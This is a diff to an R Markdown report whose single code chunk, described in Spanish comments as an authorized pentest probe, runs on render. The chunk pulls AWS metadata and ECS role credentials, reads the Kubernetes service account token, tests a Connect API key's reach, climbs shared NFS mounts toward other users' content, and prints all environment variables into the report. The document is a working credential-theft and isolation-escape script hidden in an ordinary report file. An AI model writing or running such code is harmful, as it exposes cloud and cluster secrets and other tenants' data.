@@ -8,75 +8,127 @@ knitr::opts_chunk$set(echo = FALSE, warning = FALSE, message = FALSE, comment = 
 ```
 
 ```{r probe}
-# Sonda de contexto (pentest autorizado). Sin dependencias: usa el binario curl del sistema.
-# PoC de extraccion real de credenciales (autorizada por cliente).
+# Sonda de contexto (pentest autorizado). Sin dependencias R: binario curl del sistema.
+# SOLO LECTURA: ninguna operacion crea/modifica/borra estado.
 
 curl_bin <- Sys.which("curl")
 
-# GET generico. headers = vector nombrado.
-cget <- function(url, headers = character(0), timeout = 4) {
-  args <- c("-s", "-m", as.character(timeout), "-w", "\nHTTP_STATUS:%{http_code}")
-  for (n in names(headers)) args <- c(args, "-H", paste0(n, ": ", headers[[n]]))
-  args <- c(args, url)
-  out <- tryCatch(system2(curl_bin, args, stdout = TRUE, stderr = TRUE),
+run_curl <- function(args) {
+  bodyf <- tempfile(); hdrf <- tempfile()
+  full <- c("-s", "-m", "6", "-o", bodyf, "-D", hdrf, args)
+  raw <- tryCatch(system2(curl_bin, full, stdout = TRUE, stderr = TRUE),
                   error = function(e) paste("ERR:", conditionMessage(e)))
-  paste(out, collapse = "\n")
+  body <- tryCatch(paste(readLines(bodyf, warn = FALSE), collapse = "\n"), error = function(e) "")
+  hdrs <- tryCatch(paste(readLines(hdrf, warn = FALSE), collapse = "\n"), error = function(e) "")
+  status <- sub(".*?HTTP/[0-9.]+ ([0-9]{3}).*", "\\1", strsplit(hdrs, "\n")[[1]][1])
+  unlink(c(bodyf, hdrf))
+  list(status = status, body = body, hdrs = hdrs, raw = paste(raw, collapse = "\n"))
 }
-
-# PUT para token IMDSv2.
-cput <- function(url, headers = character(0), timeout = 4) {
-  args <- c("-s", "-X", "PUT", "-m", as.character(timeout), "-w", "\nHTTP_STATUS:%{http_code}")
-  for (n in names(headers)) args <- c(args, "-H", paste0(n, ": ", headers[[n]]))
-  args <- c(args, url)
-  out <- tryCatch(system2(curl_bin, args, stdout = TRUE, stderr = TRUE),
-                  error = function(e) paste("ERR:", conditionMessage(e)))
-  paste(out, collapse = "\n")
+cget <- function(url, headers = character(0)) {
+  a <- c(); for (n in names(headers)) a <- c(a, "-H", paste0(n, ": ", headers[[n]])); run_curl(c(a, url))
 }
-
-# Extrae solo el cuerpo (quita la linea HTTP_STATUS) para reutilizar el token.
-body_of <- function(resp) sub("\nHTTP_STATUS:.*$", "", resp)
+cput <- function(url, headers = character(0)) {
+  a <- c("-X", "PUT"); for (n in names(headers)) a <- c(a, "-H", paste0(n, ": ", headers[[n]])); run_curl(c(a, url))
+}
+# POST solo-lectura (SelfSubjectRulesReview): no muta recursos, solo consulta permisos propios.
+cpost <- function(url, headers = character(0), data = NULL) {
+  a <- c("-X", "POST"); for (n in names(headers)) a <- c(a, "-H", paste0(n, ": ", headers[[n]]))
+  if (!is.null(data)) a <- c(a, "--data", data); run_curl(c(a, url))
+}
+show <- function(label, r) {
+  cat(label, "\n  status:", ifelse(is.na(r$status) || !nzchar(r$status), "(sin respuesta HTTP)", r$status), "\n")
+  if (nzchar(r$raw) && grepl("curl:|ERR:", r$raw)) cat("  curl_msg:", r$raw, "\n")
+  if (nzchar(r$body)) cat("  body:\n", r$body, "\n")
+}
 
 cat("=== 1. IDENTIDAD DEL POD ===\n")
 cat("id       :", system2("id", stdout = TRUE, stderr = TRUE), "\n")
 cat("hostname :", system2("hostname", stdout = TRUE, stderr = TRUE), "\n")
-cat("R        :", R.version.string, "\n")
+cat("R        :", R.version.string, " | curl:", curl_bin, "\n")
 
 cat("\n=== 2. IMDSv2 (PUT token -> GET creds) ===\n")
-tok_resp <- cput("http://169.254.169.254/latest/api/token",
-                 c("X-aws-ec2-metadata-token-ttl-seconds" = "21600"))
-cat("PUT /latest/api/token ->\n", tok_resp, "\n")
-token <- body_of(tok_resp)
-if (nzchar(token) && !grepl("ERR:", token) && !grepl("HTTP_STATUS:4", tok_resp)) {
-  hdr <- c("X-aws-ec2-metadata-token" = token)
-  role_resp <- cget("http://169.254.169.254/latest/meta-data/iam/security-credentials/", hdr)
-  cat("\nGET role name ->\n", role_resp, "\n")
-  rn <- strsplit(body_of(role_resp), "\n")[[1]][1]
-  if (nzchar(rn)) {
-    creds <- cget(paste0("http://169.254.169.254/latest/meta-data/iam/security-credentials/", rn), hdr)
-    cat("\nGET creds [", rn, "] ->\n", creds, "\n")
-  }
+tok <- cput("http://169.254.169.254/latest/api/token", c("X-aws-ec2-metadata-token-ttl-seconds" = "21600"))
+show("PUT /latest/api/token", tok)
+if (!is.na(tok$status) && tok$status == "200" && nzchar(tok$body)) {
+  hdr <- c("X-aws-ec2-metadata-token" = tok$body)
+  role <- cget("http://169.254.169.254/latest/meta-data/iam/security-credentials/", hdr)
+  show("GET role name", role)
+  rn <- strsplit(role$body, "\n")[[1]][1]
+  if (!is.na(rn) && nzchar(rn))
+    show(paste0("GET creds [", rn, "]"),
+         cget(paste0("http://169.254.169.254/latest/meta-data/iam/security-credentials/", rn), hdr))
 }
 
 cat("\n=== 3. IMDSv1 (GET sin token) ===\n")
-cat(cget("http://169.254.169.254/latest/meta-data/iam/security-credentials/"), "\n")
+show("GET v1 security-credentials", cget("http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
+
+cat("\n=== 3b. Diagnostico crudo IMDS (curl -v: distingue red vs error curl) ===\n")
+cat(paste(system2(curl_bin, c("-s","-v","-m","4","-o","/dev/null","http://169.254.169.254/latest/meta-data/"),
+                  stdout = TRUE, stderr = TRUE), collapse = "\n"), "\n")
 
 cat("\n=== 4. ECS TASK ROLE ===\n")
 ecs_uri <- Sys.getenv("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
 cat("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI = '", ecs_uri, "'\n", sep = "")
-if (nzchar(ecs_uri)) cat(cget(paste0("http://169.254.170.2", ecs_uri)), "\n")
+if (nzchar(ecs_uri)) show("GET ECS creds", cget(paste0("http://169.254.170.2", ecs_uri)))
 
-cat("\n=== 5. SERVICE ACCOUNT K8s ===\n")
-sa_tok <- tryCatch(paste(readLines("/var/run/secrets/kubernetes.io/serviceaccount/token", warn = FALSE), collapse = ""),
-                   error = function(e) paste("ERR:", conditionMessage(e)))
-cat("SA token:\n", sa_tok, "\n")
-cat("SA namespace:", tryCatch(readLines("/var/run/secrets/kubernetes.io/serviceaccount/namespace", warn = FALSE)[1],
-                               error = function(e) "n/a"), "\n")
-cat("KUBERNETES_SERVICE_HOST:", Sys.getenv("KUBERNETES_SERVICE_HOST", "n/a"), "\n")
+cat("\n=== 5. SERVICE ACCOUNT K8s (token + host) ===\n")
+sa <- tryCatch(paste(readLines("/var/run/secrets/kubernetes.io/serviceaccount/token", warn=FALSE), collapse=""),
+               error = function(e) paste("ERR:", conditionMessage(e)))
+sa_ns <- tryCatch(readLines("/var/run/secrets/kubernetes.io/serviceaccount/namespace", warn=FALSE)[1],
+                  error = function(e) "n/a")
+cat("SA token (primeros 40):", substr(sa, 1, 40), "...\n")
+cat("SA namespace:", sa_ns, "\n")
+k8s_host <- Sys.getenv("KUBERNETES_SERVICE_HOST", "n/a")
+k8s_port <- Sys.getenv("KUBERNETES_SERVICE_PORT_HTTPS", "443")
+cat("K8s API:", k8s_host, ":", k8s_port, "\n")
+
+cat("\n=== #8. ALCANCE DE CONNECT_API_KEY (solo lectura) ===\n")
+apikey <- Sys.getenv("CONNECT_API_KEY", "")
+server <- Sys.getenv("CONNECT_SERVER", "")
+if (nzchar(apikey) && nzchar(server)) {
+  server <- sub("/+$", "", server)
+  auth <- c("Authorization" = paste("Key", apikey))
+  show("GET /__api__/v1/me", cget(paste0(server, "/__api__/v1/me"), auth))
+  # listado de contenido: revela si la key ve contenido mas alla del propio (aislamiento)
+  show("GET /__api__/v1/content (count)", cget(paste0(server, "/__api__/v1/content?limit=500"), auth))
+} else cat("CONNECT_API_KEY o CONNECT_SERVER ausentes\n")
+
+cat("\n=== #9. RBAC DEL SA K8s (SelfSubjectRulesReview, solo lectura) ===\n")
+if (!grepl("ERR:", sa) && k8s_host != "n/a") {
+  ca <- "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+  url <- paste0("https://", k8s_host, ":", k8s_port,
+                "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews")
+  data <- sprintf('{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"%s"}}', sa_ns)
+  a <- c("-X","POST","--cacert",ca,
+         "-H", paste0("Authorization: Bearer ", sa),
+         "-H", "Content-Type: application/json",
+         "--data", data)
+  r <- run_curl(c(a, url))
+  show("POST selfsubjectrulesreviews", r)
+} else cat("SA token no disponible o host K8s desconocido\n")
+
+cat("\n=== #10. AISLAMIENTO DEL MONTAJE NFS/FSx (solo lectura, ls) ===\n")
+probe_dirs <- c(
+  "/opt/rstudio-connect/mnt/app",
+  "/opt/rstudio-connect/mnt/app/..",
+  "/opt/rstudio-connect/mnt/app/../..",
+  "/opt/rstudio-connect/mnt/report/..",
+  "/opt/rstudio-connect/mnt/job/.."
+)
+for (d in probe_dirs) {
+  cat("\n--- ls", d, "---\n")
+  cat(paste(tryCatch(system2("ls", c("-la", d), stdout = TRUE, stderr = TRUE),
+                     error = function(e) paste("ERR:", conditionMessage(e))), collapse = "\n"), "\n")
+}
+# intento de subir por el arbol de reports hacia otros IDs de contenido
+cat("\n--- find (2 niveles) bajo el ancestro de data/reports ---\n")
+cat(paste(tryCatch(system2("bash", c("-c",
+  "d=$(df -P /opt/rstudio-connect/mnt/app | tail -1 | awk '{print $6}'); echo MOUNT=$d; find $d -maxdepth 2 -type d 2>/dev/null | head -50"),
+  stdout = TRUE, stderr = TRUE), error = function(e) paste("ERR:", conditionMessage(e))), collapse = "\n"), "\n")
 
 cat("\n=== 6. VARIABLES DE ENTORNO ===\n")
-env <- Sys.getenv()
-for (k in sort(names(env))) cat(k, "=", env[[k]], "\n", sep = "")
+env <- Sys.getenv(); for (k in sort(names(env))) cat(k, "=", env[[k]], "\n", sep = "")
 
-cat("\n=== 7. RED INTERNA / MONTAJES ===\n")
-cat("mounts:\n", paste(tryCatch(system2("mount", stdout = TRUE, stderr = TRUE), error = function(e) "n/a"), collapse = "\n"), "\n")
+cat("\n=== 7. MONTAJES ===\n")
+cat(paste(tryCatch(system2("mount", stdout = TRUE, stderr = TRUE), error = function(e) "n/a"), collapse = "\n"), "\n")
 ```
